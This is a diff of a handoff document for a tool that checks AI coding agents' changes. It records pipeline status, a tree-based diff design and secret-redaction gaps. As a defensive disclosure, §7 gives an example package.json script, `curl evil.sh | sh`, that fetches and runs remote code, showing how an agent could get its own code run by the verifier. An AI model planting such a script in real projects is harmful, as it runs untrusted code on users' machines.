@@ -1,7 +1,7 @@
 # Crosscheck — State & Handoff
 
 **Last verified:** 9 August 2026
-**Branch:** `feat/verification-pipeline2` → `main`
+**Branch:** `feat/tree-attribution-and-privacy-seam` → `main`
 **Remote:** https://github.com/crosscheck-sh/crosscheck (private)
 
 This document is written for someone picking the project up cold, with their own
@@ -30,12 +30,14 @@ deciding whether it is safe to ship.**
 
 ## 2. Status in one paragraph
 
-The plumbing is built and green. Lint, typecheck, 41 tests and the build all
-pass; the CLI runs end to end on fake data. **The product itself is unvalidated.**
-No test exercises a real model response, and the pipeline has been run against a
-live `ANTHROPIC_API_KEY` exactly once, on one repository. Nobody has measured
-whether the verdicts are any good. That is the single most important open
-question and everything in §7 is subordinate to it.
+The plumbing is built and green. Lint, typecheck, 74 tests and the build all
+pass. The full four-stage pipeline has now been run against a live
+`ANTHROPIC_API_KEY` on real content — see §11 — and it works: all three models
+returned schema-valid structured output, the Judge produced a reasoned verdict,
+and the policy engine applied it. **The product itself is still unvalidated.**
+That is n=2 real runs, on one repository. Nobody has measured whether the
+verdicts are any good across a corpus. That remains the single most important
+open question and everything in §7 is subordinate to it.
 
 ---
 
@@ -73,13 +75,17 @@ pnpm test
 
 ## 4. How a run works
 
-1. **Snapshot before** — HEAD sha, staged/unstaged diffs, untracked files, content
-   hashes. This is the baseline.
+1. **Snapshot before** — a real git *tree object* for the whole worktree
+   (tracked, staged and untracked alike), written to a temp index and temp object
+   store so the repository is never touched. This is the baseline.
 2. **Run the wrapped command** — transparent subprocess; stdin inherited, signals
    forwarded, colours preserved. The agent has no idea Crosscheck exists.
-3. **Snapshot after** — compute the *attributable diff*: what changed because of
-   this command, minus anything already dirty beforehand. This is the hardest
-   correctness problem in the codebase and the most defensible work in it.
+3. **Snapshot after** — build a second tree and `git diff baseline final`. That
+   *is* the attributable diff: pre-existing dirt is already baked into the
+   baseline tree, so everything the diff reports is by construction the command's
+   doing, down to the hunk. This is the hardest correctness problem in the
+   codebase and the most defensible work in it. See §11 for why the previous
+   path-set approach could not be made correct.
 4. **Pipeline:**
    - **Scout** (LLM) — scope, intent, risk level, what the Reviewer should focus
      on. Recommends verification goals in plain English only; never emits shell.
@@ -100,12 +106,25 @@ pnpm test
 1. The verifier is independent of the generator.
 2. Every finding references concrete evidence.
 3. LLM output never reaches shell execution — Builder uses a deterministic
-   allowlist only.
+   allowlist only. **Partially true — see §7.** Scout's text never becomes a
+   command, but Builder runs `package.json` scripts, which the wrapped agent may
+   have just rewritten.
 4. Deterministic evidence outranks model opinion.
-5. Crosscheck never mutates the repository during verification.
-6. A stage that did not execute is never reported as passed.
-7. Pre-existing changes are never attributed to the wrapped command.
-8. Secrets and excluded paths are redacted before any remote inference.
+5. Crosscheck never mutates the repository during verification. **True of
+   Crosscheck itself** — tree building uses a temp index and temp object store,
+   asserted by a test. Not true of the Builder, which runs your real
+   build/test and so can write `dist/`, coverage and snapshots.
+6. A stage that did not execute is never reported as passed. Extended: a check
+   whose *tool* is missing reports `unavailable`, never `failed` — absence of
+   evidence must not read as evidence of a defect.
+7. Pre-existing changes are never attributed to the wrapped command. Enforced
+   structurally by tree diffing rather than by path arithmetic, so it now holds
+   at hunk level, including for a file that was already dirty and then edited
+   further.
+8. Secrets and excluded paths are redacted before any remote inference. Enforced
+   by the type system: `RawPatch` and `SafePatch` are distinct types and only
+   `SafePatch` reaches a prompt. Previously this invariant was documented but
+   **not actually true** — the sanitiser existed and nothing called it.
 9. A failed or interrupted run still leaves a partial report.
 
 ---
@@ -121,7 +140,8 @@ src/
   core/
     run/          run-orchestrator, run-state, run-context, run-pruner
     repository/   git-repository, repository-snapshot, diff-capture,
-                  file-selection, repo-fingerprint
+                  worktree-tree, file-selection, repo-fingerprint
+    privacy/      patch-types (RawPatch/SafePatch brands), diff-sanitizer
     execution/    command-runner, signal-forwarding, terminal-bridge, output-capture
     context/      context-selector, context-budget, file-slicer, source-redaction
     pipeline/     verification-pipeline, stage
@@ -133,7 +153,8 @@ src/
   stages/
     scout/        scout-stage, scout-prompt, scout-schema
     builder/      builder-stage, project-detector, command-planner,
-                  command-executor, log-sanitizer, command-allowlist
+                  command-executor, executable-lookup, log-sanitizer,
+                  command-allowlist
     reviewer/     reviewer-stage, reviewer-prompt, reviewer-schema,
                   deterministic-rules/ (7 rules)
     judge/        judge-stage, judge-prompt, judge-schema
@@ -178,10 +199,26 @@ Exit codes: `0` pass/advisory · `1` internal error · `2` policy block ·
 
 ## 7. What is NOT done — read this before planning
 
-**The core is unvalidated.** All 41 tests use `FakeProvider`, which throws
-immediately. They prove the pipeline degrades gracefully; they prove nothing
-about output quality. One real run, on one repo, found four genuine issues. That
-is n=1.
+**The Builder executes scripts the agent just wrote.** `detectProject` reads
+`package.json` *after* the wrapped command has run, and the planner turns those
+scripts into `pnpm run test` / `lint` / `build`. An agent that writes
+`"test": "curl evil.sh | sh"` gets it executed by the verifier. The allowlist in
+`command-allowlist.ts` only validates `config.builder.commands` — it never sees
+script bodies. This is the most serious known issue in the codebase and it
+contradicts invariant 3. Fixing it probably means running the Builder in a
+disposable worktree or container, or diffing `package.json` scripts against
+their baseline and refusing to run changed ones.
+
+**The core is unvalidated.** The 74 tests are real but offline: `FakeProvider`
+throws immediately, so no test exercises a model response. They prove the
+pipeline degrades gracefully and that diff attribution and redaction are
+correct; they prove nothing about verdict quality. Two real runs, on one repo.
+That is n=2.
+
+**`blocking` mode fails open.** If the Judge stage throws, `policy` is left
+undefined and the orchestrator falls back to the wrapped command's exit code — so
+a run whose verification collapsed exits 0. For a gating tool that is the wrong
+default; an infrastructure failure in `blocking` mode should exit 3.
 
 **`datasets/` is three empty READMEs.** The previous version of this document
 described "end-to-end fixtures with expected verdicts" and implied only a test
@@ -208,8 +245,26 @@ chain the docs describe is half-wired.
   unobserved.
 
 **Known limitations:**
-- Redaction has 3 shallow tests, and `excludePatterns` is a denylist, which fails
-  open. This is load-bearing for the "we don't leak your secrets" claim.
+- `excludePatterns` is a denylist, which fails open, and it is load-bearing for
+  the "we don't leak your secrets" claim. The shipped defaults have a concrete
+  gap: `.env` matches only at the repository root. `src/.env` and
+  `config/.env.local` are **not** excluded. Prefix the patterns with `**/`.
+- Redaction is regex-based, so `redactCommandLine` cannot catch a bare
+  positional secret (`deploy MYSECRET123`) with no `key=` prefix or vendor
+  prefix. Strictly better than the nothing it replaced; not a guarantee.
+- Four config keys are declared in the schema and never read:
+  `requireBuilderSuccess`, `builder.installDependencies`, `builder.maxLogBytes`,
+  `privacy.redactEnvironmentValues`. Silently-ignored privacy settings are worse
+  than absent ones — either honour them or delete them.
+- Builder commands are split on spaces, so a custom command with a quoted
+  argument breaks; and `SHELL_OPERATORS` rejects `\`, so no Windows path can be
+  configured.
+- `crosscheck verify` does not write `diff.patch`, though `run` does.
+- `pnpm format:check` currently fails on ~41 files of pre-existing style drift,
+  so the CI `Format check` step is red independently of any change. On Windows
+  this looks far worse than it is: with `core.autocrlf=true`, no `.gitattributes`
+  and no `endOfLine` in `.prettierrc`, *every* file reads as CRLF and fails
+  locally while CI sees LF.
 - Binaries cannot be built on Windows — needs Linux CI. Use npm on Windows.
 - `memory.json` writes use a file lock that times out after 10s with a warning,
   not a hard error.
@@ -237,6 +292,9 @@ because the noise teaches people to ignore it.
 
 ## 9. Conventions in this repo
 
+- **Never send `diff.patch` anywhere.** Use `diff.safePatch`. The type system
+  enforces this; if you find yourself casting to get around it, stop.
+
 - **pnpm only.** There is no `package-lock.json`; `npm ci` will fail.
 - **Husky + lint-staged** run eslint and prettier on staged files at commit.
 - **`prepare` sets up the git hook; `prepack` builds.** Do not move the build back
@@ -259,7 +317,7 @@ because the noise teaches people to ignore it.
 
 ---
 
-## 10. What landed most recently
+## 10. What landed before that
 
 Eleven commits on `feat/verification-pipeline2`, newest first:
 
@@ -281,6 +339,75 @@ Several of these were bugs that would have broken a real user: every install URL
 pointed at a repo that doesn't exist, the release workflow would have failed on
 its first step, and the npm package would have shipped the entire original
 TypeScript source.
+
+---
+
+## 11. Tree attribution and the privacy seam
+
+`worktree-tree.ts` and `diff-sanitizer.ts` had been written on a previous branch
+but **nothing imported either of them** — both were dead code, and the privacy
+guarantee they were meant to provide was not in effect. This branch wires them
+in and closes the resulting gaps.
+
+**Attribution is now tree-based.** Previously: `git status` paths minus paths
+dirty at baseline, with the patch coming from `git diff HEAD`. That is only ever
+correct at file granularity, and it had four separate defects — a file already
+dirty and then edited by the agent was excluded wholesale, so the agent's edit
+vanished; `git diff HEAD` never contains untracked files, so
+`includeUntrackedFiles` changed the file list but not the patch; a pre-existing
+edit to a file larger than `maxFileBytes` was silently skipped from the baseline
+and therefore attributed to the command; and `+`/`-` counts came from a regex
+that missed added blank lines. Diffing two real tree objects fixes all four
+structurally rather than case by case.
+
+**The raw/safe split is a type, not a convention.** `RawPatch` and `SafePatch`
+are distinct branded types. Prompts and reports take `SafePatch`; deterministic
+secret rules and the Builder cache key deliberately take `RawPatch` — a rule that
+only sees `[REDACTED]` can never fire, and hashing a redacted patch collapses
+different secrets to one cache key. `prepareSafePatch` is the only route between
+them and enforces redact-*then*-truncate, because truncating first can cut a
+private-key block before its `-----END`, which both the regex and the block
+tracker depend on.
+
+**Verifying the fix found a second leak.** With the diff clean, a smoke test
+still showed secrets in `report.{json,md,html}`: `wrappedCommand` was echoed
+verbatim into all three *and* into the Scout prompt, so a token passed as a CLI
+flag went to the API. Now redacted at those four sites; raw argv is retained in
+`metadata.json`, which is local forensics.
+
+**Missing tools no longer masquerade as failures.** The first real end-to-end run
+reported `3 failure(s)` and the Judge correctly downgraded the verdict to WARN
+for lack of verification signal — but the true cause was that `pnpm` was not on
+PATH. On Windows cross-spawn routes an unresolvable command through `cmd.exe`,
+which exits 1 identically to a genuine test failure. `executable-lookup.ts` now
+resolves the binary first and reports the schema's previously-unused
+`unavailable` status, which produces a *limitation* rather than *evidence*.
+Builder limitations are now also passed to the Reviewer and Judge prompts, which
+never saw them.
+
+**Deliberate design choices, so they are not "fixed" by mistake:**
+- `.crosscheck/runs/<id>/diff.patch` stays **unredacted**. It is gitignored,
+  local, and a redacted forensic artifact is worse than useless when triaging a
+  leak. Everything that leaves the machine is sanitised; this does not leave.
+- `commandIntroducedPaths` and `preExistingChangedPaths` may now **overlap**.
+  That is the "already dirty, then edited further" case and it is correct. The
+  Markdown report marks the overlap explicitly; do not restore the old
+  "not attributed to this command" heading, which is now wrong for those files.
+- `worktree-tree.ts` calls `git` through `execa`, not `simple-git`. simple-git's
+  unsafe-operation guard rejects the module's own hardening flags
+  (`-c core.pager`, `-c diff.external`) and any inherited `GIT_EDITOR` or
+  `SSH_ASKPASS`. Every argv there is a compile-time constant. The module also
+  strips the whole `GIT_*` namespace from the child environment, so running
+  Crosscheck inside a git hook cannot retarget the plumbing at the hook's
+  repository via an inherited `GIT_DIR` or `GIT_INDEX_FILE`.
+
+**Verified by running it, not by reading it:** 74 tests pass, including a
+`--shared` clone case proving blobs resolve through chained
+`objects/info/alternates`, and an assertion that the repository's own index and
+status are untouched by tree building. A live four-stage run on this diff
+returned WARN at 70% confidence; of its ten findings, two were real (both fixed
+here), one was disproved by the alternates test above, one was a correctly
+identified test fixture, and the rest were low-confidence noise.
 
 ---
 
